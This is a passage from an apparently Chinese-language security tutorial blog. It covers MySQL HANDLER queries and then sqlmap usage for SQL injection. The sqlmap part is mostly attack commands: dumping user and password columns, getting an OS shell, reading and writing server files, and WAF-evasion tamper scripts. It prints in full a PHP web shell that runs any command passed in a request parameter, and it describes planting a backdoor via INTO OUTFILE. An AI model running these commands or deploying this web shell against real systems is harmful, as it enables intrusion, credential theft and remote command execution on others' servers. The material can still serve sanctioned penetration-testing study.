next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">handler handler_table read next;</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/06/02/yvMD6oPbEw514RG.png" alt="image-20210602174326041"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> handler handler_table <span class="keyword">close</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> handler handler_table read next;</span><br><span class="line">ERROR <span class="number">1109</span> (<span class="number">42</span>S02): <span class="literal">Unknown</span> <span class="keyword">table</span> <span class="string">&#x27;handler_table&#x27;</span> <span class="keyword">in</span> HANDLER</span><br></pre></td></tr></table></figure><p><strong>通过索引查表：需要创建索引</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄，命名为 p</span><br><span class="line">handler handler_table <span class="keyword">open</span> <span class="keyword">as</span> p;</span><br><span class="line">#查看数据</span><br><span class="line">handler p read handler_index <span class="keyword">first</span>;#第一行</span><br><span class="line">handler p read handler_index next;#下一行</span><br><span class="line">handler p read handler_index prev;#上一行</span><br><span class="line">handler p read handler_index <span class="keyword">last</span>;#最后一行</span><br><span class="line">#关闭句柄</span><br><span class="line">handler p <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#以 handler_table 中的 id 字段创建索引，命名为 handler_index</span><br><span class="line"><span class="keyword">create</span> index handler_index <span class="keyword">on</span> handler_table(id);</span><br><span class="line">#打开句柄</span><br><span class="line">handler handler_table <span class="keyword">open</span>;</span><br><span class="line">#查看特定位置的数据</span><br><span class="line">handler p handler_table read handler_index<span class="operator">=</span>(<span class="number">3</span>);</span><br><span class="line">handler handler_table read handler_index <span class="keyword">first</span>;#查第一条</span><br><span class="line">handler handler_table read handler_index next;#查下一条</span><br><span class="line">handler handler_table read handler_index prev;#查上一条</span><br><span class="line">handler handler_table read handler_index <span class="keyword">last</span>;#查最后一条</span><br><span class="line">#关闭句柄</span><br><span class="line">handler handler_table <span class="keyword">close</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#删除索引</span><br><span class="line"><span class="keyword">drop</span> index handler_index <span class="keyword">on</span> handler_table;</span><br></pre></td></tr></table></figure><p><strong>Handler 与 select 的比较：</strong></p><ul><li> select语句一次返回所有相关行，handler每次返回一行</li><li> HANDLER涉及的分析较少，比SELECT更快</li><li> 没有优化程序或查询校验开销</li><li> 在两个管理程序请求之间，不需要锁定表。</li></ul><p><a href="https://blog.csdn.net/JesseYoung/article/details/40785137?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162262623916780264055048%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=162262623916780264055048&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-40785137.pc_search_result_cache&utm_term=mysql%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5-handler&spm=1018.2226.3001.4187">参考</a></p><h2 id="十七、SQLmap"><a href="#十七、SQLmap" class="headerlink" title="十七、SQLmap"></a>十七、SQLmap</h2><h3 id="17-1-基本手法"><a href="#17-1-基本手法" class="headerlink" title="17.1 基本手法"></a>17.1 基本手法</h3><p><strong>简介</strong></p><ul><li>支持大量的数据库</li><li>支持多种SQL注入：布尔盲注，时间注入，报错注入，联合查询，堆叠注入，使用脚本</li><li>加上 <code>-v -3 </code> 会显示出其注入语句</li></ul> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">手册：python sqlmap.py <span class="operator">-</span>hh</span><br><span class="line"></span><br><span class="line"> 导航：python sqlmap.py <span class="comment">--wizard</span></span><br><span class="line"></span><br><span class="line"> 测试URL: python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br></pre></td></tr></table></figure><p><strong>常用测试（不确定注入手段）</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot;</span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--tamper randomcase.py</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--level 3</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>level用于设置注入等级<span class="number">1</span><span class="operator">~</span><span class="number">6</span>，等级越高，包括的自动注入手段越多</span><br></pre></td></tr></table></figure><p><strong>查看权限</strong></p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--privileges #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--roles  #枚举数据库用户角色</span></span><br></pre></td></tr></table></figure><p><strong>基本信息命令</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">查看所有用户：当当前用户有权限去读取包含所有用户的表的权限时，该命令可以列出所有的管理员用户</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--users</span></span><br><span class="line"></span><br><span class="line"> 查看当前用户：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"></span><br><span class="line"> 查看所有用户的 数据库用户密码：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line"> 获取 shell:</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--os-shell</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/BrAmhPs7UnYjp3Q.png" alt="image-20210914193530736"></p><p><strong>常用注入命令</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看数据库</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">查看 当前 网站数据库：</span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-db</span></span><br><span class="line"> </span><br><span class="line"> 获取当前网站数据库用户的名称：</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--current-user</span></span><br><span class="line"> </span><br><span class="line"> 查表</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="comment">--tables</span></span><br><span class="line"> </span><br><span class="line"> 查列</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="comment">--columns</span></span><br><span class="line"> </span><br><span class="line"> 查字段内容</span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;security&quot; <span class="operator">-</span>T &quot;users&quot; <span class="operator">-</span>C &quot;username,password&quot; <span class="comment">--dump</span></span><br></pre></td></tr></table></figure><p><strong>POST 表单，登录框注入</strong></p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">notepad post.txt将post请求复制粘贴过去</span><br><span class="line"></span><br><span class="line">post请求；python sqlmap.py <span class="operator">-</span>r &quot;post.txt(包含有post请求的文件)&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">-</span>master<span class="operator">/</span>Less<span class="number">-11</span><span class="operator">/</span> <span class="comment">--forms --level=5 --dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径<span class="operator">+</span>文件名.txt  <span class="comment">--dbs</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--password --batch</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>r post.txt <span class="comment">--os-shell</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="comment">--tables</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="comment">--columns</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="operator">-</span>D &quot;库名&quot; <span class="operator">-</span>T &quot;表名&quot; <span class="operator">-</span>C &quot;字段名（注意：包含所有的）&quot; <span class="comment">--dump</span></span><br><span class="line"> </span><br><span class="line">  python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--priveliges  #查看数据库用户权限</span></span><br><span class="line"></span><br><span class="line"> python sqlmap.py <span class="operator">-</span>u &quot;url&quot; <span class="comment">--is-dba  #判断是否是数据库管理员</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://139.9.112.46:20871/&quot; --data=&quot;uname=admin&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&quot; --sql-shell</span><br><span class="line">select @@version;  &#x27;10.0.27-MariaDB-0ubuntu0.16.04.1&#x27;</span><br><span class="line">select @@plugin_dir;  &#x27;/usr/lib/mysql/plugin/&#x27;</span><br></pre></td></tr></table></figure><h3 id="17-2-进阶"><a href="#17-2-进阶" class="headerlink" title="17.2 进阶"></a>17.2 进阶</h3><ul><li><p><strong>探测等级：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--level 5</span><br><span class="line">--level 2 # HTTP cookie等</span><br><span class="line">--level 3 # HTTP User-Agent/Referer等</span><br></pre></td></tr></table></figure><p>一共五个等级，不加 level 时等级为1，等级越高，进行测试的 Payload 越多。会自动破解出 cookie XFF等注入方式。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--is-dba # 当前用户是否是管理员权限，即当前账户是否是数据管理员账户</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/r6X9vWdYTU4zKZ1.png" alt="image-20210914194547728"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--roles # 列出数据库管理员角色</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/cOlnf2PFYtaILp4.png" alt="image-20210914194708971"></p><p>查看数据库用户角色，如果当前用户有权限读取包含所有用户的表时，即可列出。该命令仅仅适用于数据库是  Oracle 时。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--referer http://www.baidu.com</span></span><br><span class="line"># sqlmap 可进行伪造 HTTP 中的 Referer 头，当 <span class="comment">--level &gt;=3 时，可使用  referer 欺骗</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--sql-shell # 运行自定义的 sql 语句</span></span><br><span class="line"># 会进入 <span class="keyword">sql</span><span class="operator">-</span>shell<span class="operator">&gt;</span> 交互，可直接输入 <span class="keyword">sql</span> 语句进行执行</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/NTF4gzJ6BOXkfDh.png" alt="image-20210914195201939"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--os-cmd</span></span><br><span class="line"><span class="comment">--os-shell</span></span><br><span class="line"># 运行任意操作系统命令</span><br></pre></td></tr></table></figure><blockquote><p>当数据库为MySQL、PostgreSQL或SQLserver且当前用户具有权限使用特定函数时该指令生效，但实现的原理有所不同。</p></blockquote><blockquote><p>数据库为MySQL和PostgreSQL时，sqlmap商户餐一个二进制库，包含用户自定义的函数<code>sys_exec()</code>和<code>sys_eval()</code>这两个函数可以执行系统命令。在Microsoft SQL Server中，sqlmap使用xp_cmdshell存储过程，如果被禁用（2005及以上版本默认禁用），sqlmap会重新启用它，如果不存在则会被创建。</p></blockquote><blockquote><p>–os-shell 参数可以模拟一个真实的Shell，当不能执行多语句时，仍可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言。（要执行改参数，需要有数据库管理员权限，–is-dba为True）</p></blockquote><p><strong>–os-shell的利用执行条件三个：</strong></p><p>（1）网站必须是root权限</p><p>（2）攻击者需要知道网站的绝对路径</p><p>（3）GPC为off，php主动转义的功能关闭</p><p><strong>Sqlmap getshell的条件</strong></p><p>1.网站必须是root权限<br>2.知道网站的绝对路径    </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--sql-shell</span></span><br><span class="line"># 进入交互环境 输入</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>常见找绝对路径方法：</strong><br>1.网页报错信息<br>2.Phpinfo，探针<br>3.数据库查询，暴力破解</p></blockquote><p>3.PHP关闭魔术引号，php主动转义功能关闭</p><blockquote><p>magic_quotes_gpc=Off</p></blockquote><p>4.secure_file_priv=值为空：secure_file_priv参数是用来限制LOAD DATA,SELECT…OUTFILE,and LOAD_FILE()传到哪个指定目录的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/14/1l5QK3nSi4gsTJ8.png" alt="image-20210914201258493"></p><p>如果是为空，说明MYSQL默认没有secure_file_priv参数，因此在mysql-ini进行添加配置<br>添加语句secure_file_priv= 即可</p><p><strong>测试：</strong></p><ol><li><p>选择网站语言</p></li><li><p>输入绝对网站路径</p><p><img src="https://i.loli.net/2021/09/14/9YVNqXBnvTbx5CI.png" alt="image-20210914201722412"></p></li><li><p>进入 os-shell&gt; 交互环境</p><p>查看网站根目录，发现生成文件</p><p><img src="https://i.loli.net/2021/09/14/E7ovFR3PHLxKX29.png" alt="image-20210914201644753"></p><p>原理：用into outfile 函数将一个可以用来上传文件的 php 文件写到网站的根目录下</p></li><li><p>然后利用该上传脚本我们可以上传木马文件，进行访问，蚁剑链接，getshell</p><p>sqlmap 会自动利用上传文件上传一个恶意文件，该文件可以用来执行系统命令，并将结果返回，则我们可以在交互环境下，进行命令执行。</p></li></ol><p><a href="http://www.qishunwang.net/news_show_47793.aspx">http://www.qishunwang.net/news_show_47793.aspx</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13951047.html">https://www.cnblogs.com/zzjdbk/p/13951047.html</a></p><p>该上传文件页面如下：</p><p><img src="https://i.loli.net/2021/09/14/L8HBnzFbcZRwMNx.png" alt="image-20210914202116561"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">@ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$z</span>=@ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$z</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$z</span>=preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$z</span>);</span><br><span class="line">    <span class="variable">$z</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,<span class="variable">$z</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$z</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$c</span>.<span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">global</span> <span class="variable">$z</span>;</span><br><span class="line"><span class="keyword">return</span> is_callable(<span class="variable">$n</span>)<span class="keyword">and</span>!in_array(<span class="variable">$n</span>,<span class="variable">$z</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(f(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">&#123;ob_start();</span><br><span class="line">system(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;proc_open&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$y</span>=proc_open(<span class="variable">$c</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(pipe,r),<span class="keyword">array</span>(pipe,w),<span class="keyword">array</span>(pipe,w)),<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof(<span class="variable">$t</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">        <span class="variable">$w</span>.=fread(<span class="variable">$t</span>[<span class="number">1</span>],<span class="number">512</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        @proc_close(<span class="variable">$y</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;</span><br><span class="line">    <span class="variable">$w</span>=shell_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span>(f(<span class="string">&#x27;passthru&#x27;</span>))&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$w</span>=ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;popen&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$x</span>=popen(<span class="variable">$c</span>,r);</span><br><span class="line">            <span class="variable">$w</span>=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">if</span>(is_resource(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="keyword">while</span>(!feof(<span class="variable">$x</span>))&#123;</span><br><span class="line">                <span class="variable">$w</span>.=fread(<span class="variable">$x</span>,<span class="number">512</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    @pclose(<span class="variable">$x</span>);</span><br><span class="line">                    &#125;<span class="keyword">elseif</span>(f(<span class="string">&#x27;exec&#x27;</span>))&#123;</span><br><span class="line">                        <span class="variable">$w</span>=<span class="keyword">array</span>();</span><br><span class="line">                        exec(<span class="variable">$c</span>,<span class="variable">$w</span>);</span><br><span class="line">                        <span class="variable">$w</span>=join(chr(<span class="number">10</span>),<span class="variable">$w</span>).chr(<span class="number">10</span>);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$w</span>=<span class="number">0</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>.<span class="variable">$w</span>.<span class="string">&quot;&lt;/pre&gt;&quot;</span>;<span class="meta">?&gt;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--file-read</span></span><br><span class="line"># 从数据库服务器中读取文件</span><br></pre></td></tr></table></figure><p>适用于MySQL、PostgreSQL或Microsoft SQL Server且当前用户有权限执行特定的函数时。读取的文件可以是文本可以是二进制文件。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>u &quot;&quot; <span class="comment">--file-read &quot;路径&quot; -v 1</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--file-write --file-dest</span></span><br><span class="line"># 上传文件到数据库服务器中</span><br><span class="line"></span><br><span class="line"># file<span class="operator">-</span>write  从本地写入</span><br><span class="line"># file<span class="operator">-</span>dest  写入目标路径</span><br></pre></td></tr></table></figure><p>数据库：MySQL、PostgreSQL、Microsoft SQL Server<br>且：当前用户有权限使用特定的函数时。可以上传文本文件或二进制文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=本地文件路径 --file-dest 网站路径(写入路径)+&quot;/写入的文件名&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap.py <span class="operator">-</span>u &quot;http://www.xx.com/aa.aspx?id=123&quot; <span class="comment">--file-write=F:/a.aspx --file-dest D:/虚拟目录/Front/cx.aspx</span></span><br></pre></td></tr></table></figure><h3 id="17-3-–tamper"><a href="#17-3-–tamper" class="headerlink" title="17.3 –tamper"></a>17.3 –tamper</h3><p>sqlmap在默认的的情况下除了使用char()函数防止出现单引号，没有对注入的数据进行修改，还可以使用–tamper参数对数据做修改来绕过waf等设备。</p><p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357">https://blog.csdn.net/qq_34444097/article/details/82717357</a></p><p>绕过脚本目录在 <code>sqlmap/tamper</code>，目前官方提供 53 个绕过脚本</p><p><img src="https://i.loli.net/2021/09/14/yh6FDGfeZTlOcqn.png" alt="image-20210914203704034"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u [url] <span class="comment">--tamper [模块名]</span></span><br></pre></td></tr></table></figure><p>可以使用–identify-waf对一些网站是否有安全防护进行试探</p><p>0x02 常用tamper脚本<br>apostrophemask.py<br>适用数据库：ALL<br>作用：将引号替换为utf-8，用于过滤单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><p>base64encode.py<br>适用数据库：ALL<br>作用：替换为base64编码<br>使用脚本前：tamper(“1’ AND SLEEP(5)#”)<br>使用脚本后：MScgQU5EIFNMRUVQKDUpIw==</p><p>multiplespaces.py<br>适用数据库：ALL<br>作用：围绕sql关键字添加多个空格<br>使用脚本前：tamper(‘1 UNION SELECT foobar’)<br>使用脚本后：1 UNION SELECT foobar</p><p>space2plus.py<br>适用数据库：ALL<br>作用：用加号替换空格<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT+id+FROM+users</p><p>nonrecursivereplacement.py<br>适用数据库：ALL<br>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）<br>使用脚本前：tamper(‘1 UNION SELECT 2–’)<br>使用脚本后：1 UNIOUNIONN SELESELECTCT 2–</p><p>space2randomblank.py<br>适用数据库：ALL<br>作用：将空格替换为其他有效字符<br>使用脚本前：tamper(‘SELECT id FROM users’)<br>使用脚本后：SELECT%0Did%0DFROM%0Ausers</p><p>unionalltounion.py<br>适用数据库：ALL<br>作用：将union allselect 替换为unionselect<br>使用脚本前：tamper(‘-1 UNION ALL SELECT’)<br>使用脚本后：-1 UNION 